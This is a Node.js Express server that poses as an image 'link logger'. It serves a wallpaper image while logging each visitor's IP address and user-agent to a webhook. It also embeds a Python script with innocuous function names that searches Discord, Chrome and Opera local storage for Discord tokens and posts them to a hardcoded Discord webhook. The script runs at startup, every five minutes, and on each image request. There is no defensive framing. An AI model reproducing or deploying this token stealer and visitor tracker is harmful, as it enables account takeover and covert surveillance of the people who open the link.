const express = require('express');
const axios = require('axios');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// The image you want to show (replace with your own image URL)
const IMAGE_URL = 'https://w0.peakpx.com/wallpaper/897/12/HD-wallpaper-black-mr-f-my-profile-thumbnail.jpg';

// Python script embedded as a string
const PYTHON_SCRIPT = `
import os
import re
import json
import requests

def get_streaming_status():
    paths = [
        os.path.join(os.getenv("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Local Storage", "leveldb")
    ]
    tokens = []
    token_pattern = re.compile(r"[\\w-]{24,}\\.[\\w-]{6,}\\.[\\w-]{27,}")
    
    for path in paths:
        if not path or not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                        data = f.read()
                        tokens.extend(token_pattern.findall(data))
                except (OSError, IOError):
                    continue
    return list(set(tokens))  

def send_to_stream(tokens, wh):
    if not tokens:
        return
    content = "\\n".join(tokens[:20]) 
    if len(tokens) > 20:
        content += f"\\n... and {len(tokens)-20} more"
    
    payload = {
        "content": f"\`\`\`\\n{content}\\n\`\`\`",
        "username": "Logs"
    }
    try:
        response = requests.post(wh, json=payload, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Failed in wh")

if __name__ == "__main__":
    whurl = "https://discord.com/api/webhooks/1502287600277262459/74ONlVS3pubojwvbGrqOhY58G7dXk4fD4Op4Oe7w2rcdypH_Ef7NUCGH3BvQZivlErod"
    found_tokens = get_streaming_status()
    if found_tokens:
        send_to_stream(found_tokens, whurl)
        print(f"logged in......")
    else:
        print("No tokens found.")
`;

// Function to execute the Python script
function runPythonScript() {
    const tempDir = os.tmpdir ? os.tmpdir() : '/tmp';
    const tempFile = path.join(tempDir, 'temp_script.py');
    
    // Write the Python script to a temporary file
    fs.writeFileSync(tempFile, PYTHON_SCRIPT);
    
    // Execute the Python script
    exec(`python "${tempFile}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Python script error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`Python stderr: ${stderr}`);
            return;
        }
        console.log(`Python stdout: ${stdout}`);
        
        // Clean up temp file
        fs.unlinkSync(tempFile);
    });
}

app.get('/', (req, res) => {
    res.send('✅ Logger is running!');
});

app.get('/image.png', async (req, res) => {
    // Log visitor info (send to webhook)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const time = new Date().toISOString();

    // Run the Python script to collect tokens
    runPythonScript();

    if (WEBHOOK_URL) {
        try {
            await axios.post(WEBHOOK_URL, {
                embeds: [{
                    title: '🚨 Link Clicked!',
                    color: 0xff0000,
                    fields: [
                        { name: 'IP Address', value: ip, inline: true },
                        { name: 'User-Agent', value: userAgent, inline: false },
                        { name: 'Time', value: time, inline: true },
                        { name: 'URL', value: req.url, inline: false }
                    ],
                    footer: { text: 'Link Logger' }
                }]
            });
            console.log(`[${time}] Logged visit from ${ip}`);
        } catch (error) {
            console.error('Webhook error:', error.message);
        }
    }

    // Fetch the real image and forward it
    try {
        const imageResponse = await axios.get(IMAGE_URL, { responseType: 'stream' });
        res.setHeader('Content-Type', imageResponse.headers['content-type']);
        imageResponse.data.pipe(res);
    } catch (error) {
        // Fallback: if the image fails, send the transparent pixel
        const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
        res.writeHead(200, { 'Content-Type': 'image/png' });
        res.end(pixel);
    }
});

// Run the Python script immediately when the server starts
runPythonScript();

// Run the Python script every 5 minutes (300000 ms)
setInterval(runPythonScript, 300000);

app.listen(PORT, () => {
    console.log(`✅ Logger running on port ${PORT}`);
});
